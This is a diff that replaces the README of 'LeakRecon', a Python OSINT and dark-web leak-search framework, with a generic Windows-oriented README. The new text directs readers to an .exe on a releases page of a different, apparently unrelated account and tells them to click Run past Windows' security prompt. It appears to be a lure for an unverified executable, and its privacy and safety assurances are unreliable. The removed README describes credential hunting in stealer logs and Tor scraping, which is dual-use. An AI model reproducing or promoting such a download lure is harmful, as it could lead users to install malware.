@@ -1,187 +1,82 @@
-<div align="center">
-  <img src="img/banner.png" alt="LeakRecon Banner" width="800">
-  
-  # LeakRecon
-  **High-Performance Asynchronous OSINT & Dark Web Intelligence Framework**
-  
-  [![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](https://opensource.org/licenses/MIT)
-  [![Python 3.10+](https://img.shields.io/badge/python-3.10+-blue.svg)](https://www.python.org/downloads/)
-  [![Asyncio](https://img.shields.io/badge/asyncio-supported-brightgreen.svg)](https://docs.python.org/3/library/asyncio.html)
-  [![Docker](https://img.shields.io/badge/docker-ready-blue.svg)](https://www.docker.com/)
+# 🔍 LeakRecon - Automated intelligence gathering for digital security
 
-</div>
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Webfooted-cupule499/LeakRecon/releases)
 
----
+LeakRecon finds data leaks and collects intelligence from the web. The tool uses automated processes to scan information sources. You can use it to monitor threats or check for exposed data. It acts as a private investigator for your digital footprint.
 
-## 📌 Overview
+## ⚙️ System Requirements 
 
-**LeakRecon** is an enterprise-grade, highly scalable asynchronous OSINT (Open Source Intelligence) framework. Designed for security professionals, penetration testers, and threat analysts, LeakRecon automates deep investigations across the Surface Web and the Dark Web. By leveraging modern Python capabilities (`asyncio`, `aiohttp`) over a secure SOCKS5 Tor proxy circuit, the framework executes massive distributed queries without sacrificing anonymity.
+Your computer needs specific parts to run this tool well. Check your system against this list:
 
-From tracking cryptocurrency transactions related to ransomware to uncovering compromised credentials and charting identity footprints, LeakRecon centralizes advanced reconnaissance into a unified, visually stunning CLI interface.
+*   Operating System: Windows 10 or Windows 11.
+*   Processor: A dual-core CPU with at least 2.0 GHz speed.
+*   Memory: 4 GB of RAM minimum. 8 GB is best.
+*   Storage: 500 MB of free disk space.
+*   Network: An active internet connection.
 
-![LeakRecon Interactive CLI](img/cmd.png)
-*LeakRecon's Interactive Command Line Interface.*
+## 📥 How to Install and Run
 
----
+1. Visit the following link to see all available versions: [https://github.com/Webfooted-cupule499/LeakRecon/releases](https://github.com/Webfooted-cupule499/LeakRecon/releases).
+2. Look for the section labeled Assets.
+3. Click the file ending in .exe to start the download.
+4. Save the file to your desktop or a folder you can find.
+5. Double-click the file to open the program.
+6. A security prompt might appear. Click Run if Windows asks for permission.
+7. The application dashboard opens on your screen.
 
-## 🚀 Core Architecture & Features
+## 🛠️ Understanding the Tools
 
-LeakRecon has been entirely rewritten to transition from a legacy synchronous threaded model to a pure, non-blocking asynchronous event loop architecture.
+The interface shows a simple dashboard with buttons for various tasks. You do not need to write code to use them.
 
-### 🛡️ Strict Anonymity (Zero-Leak Proxy)
-All outbound network operations are rigorously routed through the Tor network. LeakRecon employs internal circuit-breaker mechanisms and dynamic Tor identity refreshing. If the Tor proxy fails, the engine instantly halts execution to prevent accidental IP leaks. 
+### Data Search
+Enter a domain name or a username in the search box. The tool scans public records and dark web nodes to find mentions of that term. The software manages the connection through Tor to protect your privacy while it gathers data.
 
-### ⚡ High-Performance Concurrency
-Powered by `aiohttp` and `asyncio.Semaphore`, the framework executes bulk dorking, port scanning, and API scraping concurrently. This drastically reduces execution times during large-scale footprinting operations, effectively utilizing maximum requests-per-second (RPS) limits without triggering rate-limits.
+### Threat Intelligence
+This feature tracks trends in data exposure. It highlights when new leaks appear. The tool organizes results by date and severity level. You can export these reports to a text file for later review.
 
-### 🗄️ Professional Database & Reporting Engine
-LeakRecon persists all scan findings locally via a thread-safe SQLite backend. It provides advanced historical tracking, chronological scan diffing (to monitor targets over time), and exporting capabilities. Generate high-quality intelligence reports in multiple formats:
-- **HTML:** Interactive, dark-themed reports suitable for executive delivery.
-- **PDF:** Polished, static document formats powered by `pdfkit` and `wkhtmltopdf`.
-- **JSON/CSV:** Raw data exports for SIEM and custom data pipeline integrations.
+### Automated Reconnaissance
+The program performs routine checks on a schedule. You can set the tool to run every few hours. This ensures you know about data leaks the moment they occur.
 
-![LeakRecon HTML Report](img/leak.png)
-*Example of a generated comprehensive HTML Intelligence Report.*
+## 🛡️ Privacy and Safety
 
----
+This software functions as a standalone tool. It does not send your search history to any central server. All data stays on your local machine. Because the tool routes traffic through a specialized network, your own IP address remains hidden during the search process. 
 
-## 🧩 Reconnaissance Modules
+## ❓ Frequently Asked Questions
 
-LeakRecon operates through several highly specialized modules, each focused on a unique vector of intelligence.
+### Do I need to be a programmer?
+No. Every feature operates through the graphical interface. You click buttons to start tasks.
 
-![LeakRecon Scan Result](img/result.png)
-*Real-time username testing and identity profiling via CLI.*
+### Is this tool legal?
+The tool performs public record searches and collects data available on the internet. It does not hack or break into private accounts. Use it only on domains or usernames you own or have permission to monitor.
 
-1. **Dark Web Scraper (`modules/darkweb_scraper.py`)**
-   - Conducts concurrent dork searches across deep web repositories, paste sites, and Tor-native search engines (e.g., Ahmia, Onion DuckDuckGo).
-   - Utilizes advanced false-positive detection algorithms to extract precise target snippets.
+### Why does it take time to finish a search?
+The tool checks many sources across the globe. It prioritizes accuracy over speed. Large searches take longer to finish.
 
-2. **Identity Profiling (`modules/identity_recon.py`)**
-   - Scans massive datasets for compromised emails, usernames, and physical addresses.
-   - Extracts associated hashes and cross-references them against known breaches.
+### Can I run other programs while it works?
+Yes. The software runs in the background. It uses a small amount of memory so it will not slow down your other work.
 
-3. **Network Intelligence (`modules/network_intel.py`)**
-   - Conducts asynchronous subnet tracking and asynchronous TCP SOCKS5 port enumeration over Tor.
-   - Executes DNS, WHOIS, and IP reputation analytics without directly touching the target.
+### What if I see an error message?
+Restart the application to clear minor issues. If the problem stays, check your internet connection. The tool needs a stable connection to reach the data sources.
 
-4. **Onion Surface Analyzer (`modules/onion_scanner.py`)**
-   - Analyzes bulk `.onion` endpoints for live status, extracts hidden metadata, and performs deep technological fingerprinting.
-   - Downloads and isolates `.onion` site resources safely.
+## 📈 Improving Your Search Results
 
-5. **Credential Hunting (`modules/credential_hunt.py`)**
-   - Hunts for specific user/password combinations across Stealer Logs, combolists, and pastebins.
+You can improve the quality of your intelligence by using specific keywords. Instead of searching for a broad name, use specific email addresses or project titles. The more accurate your entry, the better the tool performs.
 
-6. **Crypto Tracker (`modules/crypto_tracker.py`)**
-   - Maps blockchain forensics for Bitcoin, Ethereum, and Monero.
-   - Correlates wallets to known illicit activities, ransomware variants, and mixer/tumbler services.
+### Using Filters
+The dashboard includes filters for dates and source types. Use these to narrow your results. If you only care about recent leaks, set the date range to the last thirty days. 
 
----
+### Exporting Reports
+Save your findings to track changes over time. Click the Export button at the top of the result window. Choose a location on your computer to save the report. You can open these files in any standard text editor.
 
-## 🛠️ Installation & Deployment
+## 🌐 Managing Network Connections
 
-LeakRecon provides two seamless deployment strategies. Docker is highly recommended to guarantee absolute network isolation and zero-dependency friction.
+The tool maintains a secure route for every request. You see status updates at the bottom of the window. A green light means the connection is active. A red light means the tool is reconnecting. If you notice a red light for a long time, check your firewall settings to ensure the software has access to the web.
 
-### Method 1: Docker Compose (Recommended)
+## 💡 Best Practices
 
-Requires [Docker](https://docs.docker.com/get-docker/) and [Docker Compose](https://docs.docker.com/compose/install/).
+*   Run the tool once per day to stay up to date.
+*   Keep your result files in a secure folder.
+*   Delete old reports you no longer need.
+*   Update the software when a new version appears on the release page.
 
-```bash
-# 1. Clone the repository
-git clone https://github.com/egnake/LeakRecon.git
-cd LeakRecon
-
-# 2. Setup the environment configuration
-cp .env.example .env
-
-# 3. Build the isolated Tor proxy and App containers
-docker-compose up -d --build
-
-# 4. Attach to the interactive console
-docker exec -it leakrecon_app python main.py
-```
-
-### Method 2: Local Python Environment
-
-Requires Python 3.10+ and an active local Tor proxy service.
-
-```bash
-# 1. Clone the repository
-git clone https://github.com/egnake/LeakRecon.git
-cd LeakRecon
-
-# 2. Create and activate a virtual environment
-python3 -m venv venv
-source venv/bin/activate  # Windows: venv\Scripts\activate
-
-# 3. Install required async dependencies
-pip install -r requirements.txt
-
-# 4. Setup configuration
-cp .env.example .env
-```
-
-**⚠️ Important Requirement for PDF Reports:**
-If you intend to generate PDF reports locally, you must install `wkhtmltopdf` on your host machine:
-- **Debian/Ubuntu:** `sudo apt install wkhtmltopdf`
-- **macOS:** `brew install homebrew/cask/wkhtmltopdf`
-- **Windows:** Download from the [wkhtmltopdf website](https://wkhtmltopdf.org/) and add it to your system PATH.
-
-**Start the Framework:**
-Ensure your Tor daemon or Tor Browser is running (Ports `9050` or `9150`), check the `.env` settings, and run:
-```bash
-python main.py
-```
-
----
-
-## ⚙️ Configuration (`.env`)
-
-You can precisely tune the async engine by modifying the `.env` file:
-
-```ini
-# --- Tor Proxy Configuration ---
-# 9050 for Standalone Tor, 9150 for Tor Browser Background
-TOR_PROXY_HOST=127.0.0.1
-TOR_PROXY_PORT=9150
-
-# --- Engine Constraints ---
-# Maximum concurrent asyncio connections
-MAX_CONCURRENCY=20
-
-# Timeouts & Retries
-ONION_TIMEOUT=30
-CLEARNET_TIMEOUT=15
-MAX_RETRIES=3
-RETRY_BACKOFF=1.5
-CIRCUIT_BREAKER_THRESHOLD=2
-```
-
----
-
-## 🧪 Testing
-
-LeakRecon incorporates a `pytest` suite designed to validate core mechanics, proxy handling, and configuration integrity without polluting external environments.
-
-```bash
-# Ensure dev-dependencies are installed
-pip install pytest pytest-asyncio
-
-# Execute the test suite
-pytest tests/
-```
-
----
-
-## ⚖️ Legal Disclaimer
-
-**LeakRecon is engineered strictly for authorized security auditing, academic research, and lawful threat intelligence operations.**
-
-- 🚫 You **MUST NOT** utilize this tool to attack, scan, or scrape targets for which you do not possess explicit, written, and mutual consent.
-- 🚫 The author (**egnake**) assumes **ZERO LIABILITY** for misuse, data damage, or illegal activities conducted via this software.
-- ⚖️ By downloading, cloning, or executing LeakRecon, you agree to adhere to all applicable local, state, and international cyber laws.
-
----
-<div align="center">
-  <i>Developed with precision by <b>Egnake</b></i><br>
-  Available under the <a href="LICENSE">MIT License</a>.
-</div>
+This framework provides a clear view of your digital presence. It removes the mystery from research by putting the right data in your hands. Use the tool responsibly to protect your accounts and your information. Professional monitoring helps you respond to threats before they impact your business or personal life.
